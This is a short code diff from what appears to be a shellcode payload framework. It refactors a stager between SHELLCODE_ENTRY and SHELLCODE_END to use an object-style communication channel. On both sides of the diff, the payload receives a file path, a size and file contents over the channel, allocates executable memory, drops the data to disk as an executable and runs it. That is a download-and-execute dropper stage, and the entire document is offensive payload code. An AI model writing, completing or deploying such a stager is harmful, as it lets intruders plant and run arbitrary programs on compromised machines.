@@ -7,20 +7,20 @@
 
 SHELLCODE_ENTRY {
 
-    struct channel chan = get_communication_channel();
+    Channel channel;
     unsigned int file_sz;
     char file_path[256];
     void *file_contents;
 
     /* Read the path. */
-    channel_recv(chan, file_path, sizeof(file_path));
+    channel.recv(file_path, sizeof(file_path));
 
     /* Read the file size. */
-    channel_recv(chan, &file_sz, sizeof(file_sz));
+    channel.recv(&file_sz, sizeof(file_sz));
     
     /* Read the file data. */
     file_contents = allocate_memory(file_sz, PROT_READ|PROT_WRITE|PROT_EXEC);
-    channel_recv(chan, file_contents, file_sz);
+    channel.recv(file_contents, file_sz);
 
     /* Drop executable file. */
     drop_file(file_path, S_IRUSR|S_IWUSR|S_IXUSR, file_contents, file_sz); 
@@ -29,6 +29,6 @@ SHELLCODE_ENTRY {
     char *const envp[] = { NULL };
 
     /* Execute the dropped executable. */
-    execute(file_path, argv, envp, chan);
+    execute(file_path, argv, envp, channel);
 
 } SHELLCODE_END
